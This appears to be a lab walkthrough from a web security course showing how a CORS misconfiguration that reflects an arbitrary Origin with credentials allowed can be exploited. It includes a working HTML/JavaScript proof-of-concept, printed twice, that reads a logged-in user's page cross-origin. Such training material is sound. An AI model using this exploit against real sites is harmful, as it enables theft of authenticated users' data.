# Lab 1: CORS With Arbitrary Origin

## Introduction to the Lab

This lab is focused to show you how an arbitrary origin can lead to leak sensitive information in a web application. In this lab we will learn how an attacker can use their controlled domain to make a arbitrary request and fetch sensitive information from the web application.

## Steps to Reproduce:

We are given with a page which shows something like this,

![https://i.imgur.com/eUGimrR.png](https://i.imgur.com/eUGimrR.png)

Let's capture this request in our burpsuite and send it to the repeater. 

![Lab%201%20CORS%20With%20Arbitrary%20Origin%2082bcc7f59f4146f092cc47391641145c/Untitled.png](Lab%201%20CORS%20With%20Arbitrary%20Origin%2082bcc7f59f4146f092cc47391641145c/Untitled.png)

Great job, We can see that we have been asked to fetch the HTTP response of the web application we are dealing with. 

We can also see that the response has a header named `access-control-allow-credentials: true` 

What now?

Yes, Let's try to add an Origin header in the request and assign it's value with `attacker.com`

If it reflect back in the response then we know what it is right? Ye got a CORS issue in the web application.

![Lab%201%20CORS%20With%20Arbitrary%20Origin%2082bcc7f59f4146f092cc47391641145c/Untitled%201.png](Lab%201%20CORS%20With%20Arbitrary%20Origin%2082bcc7f59f4146f092cc47391641145c/Untitled%201.png)

Which returns the response

![Lab%201%20CORS%20With%20Arbitrary%20Origin%2082bcc7f59f4146f092cc47391641145c/Untitled%202.png](Lab%201%20CORS%20With%20Arbitrary%20Origin%2082bcc7f59f4146f092cc47391641145c/Untitled%202.png)

Awesome!! 

So from here we can say that this web app is vulnerable to Cross origin Resource sharing as it reflects our malicious origin back in the response. 

Time to Exploit :D

We will use the same HTML code given in the documentation, i.e)

```jsx
<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
          var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
              if (this.readyState == 4 && this.status == 200) {
                document.getElementById("emo").innerHTML = alert(this.responseText);
          }
         };
         xhttp.open("GET", "https://labs.hacktify.in/arbitrary_origin.php", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS PoC Exploit </h2>
      <h3>Show full content of page</h3>
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>
```

Make sure to change the URL of the target web application.

Now open the HTML file on your browser and hit exploit,

![Lab%201%20CORS%20With%20Arbitrary%20Origin%2082bcc7f59f4146f092cc47391641145c/Untitled%203.png](Lab%201%20CORS%20With%20Arbitrary%20Origin%2082bcc7f59f4146f092cc47391641145c/Untitled%203.png)

Can you see you got a pop up?

![Lab%201%20CORS%20With%20Arbitrary%20Origin%2082bcc7f59f4146f092cc47391641145c/Untitled%204.png](Lab%201%20CORS%20With%20Arbitrary%20Origin%2082bcc7f59f4146f092cc47391641145c/Untitled%204.png)

We have exploited this lab successfully.

## Payload(s) Used:

This given code can be used to exploit CORS in this lab.

```jsx
<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
          var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
              if (this.readyState == 4 && this.status == 200) {
                document.getElementById("emo").innerHTML = alert(this.responseText);
          }
         };
         xhttp.open("GET", "https://labs.hacktify.in/arbitrary_origin.php", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS PoC Exploit </h2>
      <h3>Show full content of page</h3>
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>
```

## Conclusion

This lab was based on a simple demonstration of how an attacker can use malicious origin to fetch sensitive information from a web application. This is the most basic test case as it deals with no filters and sanitization. We will look into more such complex cases in the coming labs.